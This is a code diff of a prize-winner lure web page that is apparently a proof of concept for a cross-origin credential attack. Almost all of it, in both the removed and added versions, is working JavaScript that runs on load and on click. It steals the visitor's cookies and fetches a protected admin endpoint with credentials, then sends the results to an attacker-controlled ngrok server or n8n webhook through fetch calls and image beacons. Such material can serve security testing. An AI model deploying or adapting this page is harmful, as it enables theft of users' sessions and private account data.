@@ -1,53 +1,102 @@
 <!DOCTYPE html>
 <html>
-<head><title>Claim Your Free Prize!</title></head>
+<head>
+  <meta charset="utf-8">
+  <title>Claim Your Prize!</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 2rem; }
+    #log { white-space: pre-wrap; text-align: left; margin: 1rem auto; max-width: 800px; background: #f4f4f4; padding: 1rem; border-radius: 8px; }
+  </style>
+</head>
 <body>
-  <h1>Click to Claim Your Prize!</h1>
+  <h1>Congrats! You're a Winner!</h1>
   <p>Verifying your account...</p>
+  <pre id="log">Initializing...</pre>
 
   <script>
-    (function() {
-      const attackerServer = "https://your-server.ngrok.app/"; // Your server collecting data
-      const targetUrl = "https://example.com/account/tickets/"; // Endpoint on target site
+    const LOG = document.getElementById('log');
+    const N8N_WEBHOOK = 'http://localhost:5678/webhook-test/cookie-capture'; // make sure this reflects your n8n workflow webhook address
+    const TARGET_PAGE = 'https://example.com/api/v2/admin'; // CHANGE THIS: protected page (e.g., /profile, /admin, /api/user)
 
-    (async () => {
-      const STEAL = "https://your-server.ngrok.app/steal";
+    function log(msg) {
+      LOG.textContent += '\n' + msg;
+      console.log(msg);
+    }
+
+    // 1. Exfiltrate non-HttpOnly cookies (for proof)
+    function exfilCookies() {
       const cookies = document.cookie;
-      if (cookies) {
-        await fetch(STEAL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ cookies })
-        });
-        console.log("Cookies sent successfully");
-      }
-    })();
+      if (!cookies) return log('[-] No non-HttpOnly cookies.');
 
-    fetch('https://your-server.ngrok.app/collect-evidence', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cookies: document.cookie }),
-      credentials: 'include'
-    })
-      // Fetch target URL with credentials to send cookies
-      fetch(targetUrl, {
-        method: 'GET',
-        credentials: 'include',
-        mode: 'cors'
-      })
-      .then(response => response.text())
-      .then(data => {
-        // Exfiltrate response data (including cookies if accessible) to attacker server
-        return fetch(attackerServer + '/collect', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ data: data })
+      const payload = { type: 'cookies', cookies, url: location.href, ts: Date.now() };
+      new Image().src = `${N8N_WEBHOOK}?data=${encodeURIComponent(btoa(JSON.stringify(payload)))}`;
+      log('[+] non-HttpOnly cookies exfiltrated');
+    }
+
+    // 2. Fetch protected page WITH credentials (HttpOnly cookies sent automatically!)
+    async function fetchAndExfiltrate() {
+      try {
+        log(`[+] Fetching protected page: ${TARGET_PAGE}`);
+        const resp = await fetch(TARGET_PAGE, {
+          method: 'GET',
+          credentials: 'include',  // This sends ALL cookies (HttpOnly too!)
+          mode: 'cors'             // Change to 'no-cors' if blocked (but loses body)
         });
-      })
-      .then(() => console.log('Exfiltration complete'))
-      .catch(err => console.error('Error:', err));
-    })();
+
+        const contentType = resp.headers.get('content-type') || '';
+        let data;
+
+        if (contentType.includes('application/json')) {
+          data = await resp.json();
+        } else {
+          data = await resp.text();  // HTML
+        }
+
+        // Truncate if huge
+        const preview = typeof data === 'string' ? data.slice(0, 500) : JSON.stringify(data).slice(0, 500);
+
+        log(`[+] Page fetched (${resp.status})\nPreview: ${preview}...`);
+
+        // Exfiltrate full response
+        const payload = {
+          type: 'page',
+          url: TARGET_PAGE,
+          status: resp.status,
+          data: data,
+          ts: Date.now(),
+          origin: location.origin
+        };
+
+        // Use GET beacon (no CORS issues)
+        const blob = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
+        new Image().src = `${N8N_WEBHOOK}?exfil=${blob}`;
+
+        log('[+] Protected page exfiltrated to n8n!');
+
+      } catch (err) {
+        log(`[-] Fetch failed: ${err.message}`);
+
+        // Fallback: try no-cors (won't get body, but proves access)
+        fetch(TARGET_PAGE, { credentials: 'include', mode: 'no-cors' })
+          .then(() => log('[+] no-cors request sent (proof of access)'));
+      }
+    }
+
+    // Run everything
+    window.addEventListener('load', () => {
+      log('[i] PoC loaded on: ' + location.href);
+      exfilCookies();
+      fetchAndExfiltrate();
+
+      // Retry in case page loads slowly or SPA
+      setTimeout(fetchAndExfiltrate, 3000);
+    });
+
+    // Click to re-trigger (helps with SameSite=Lax)
+    document.addEventListener('click', () => {
+      exfilCookies();
+      fetchAndExfiltrate();
+    });
   </script>
 </body>
 </html>
-
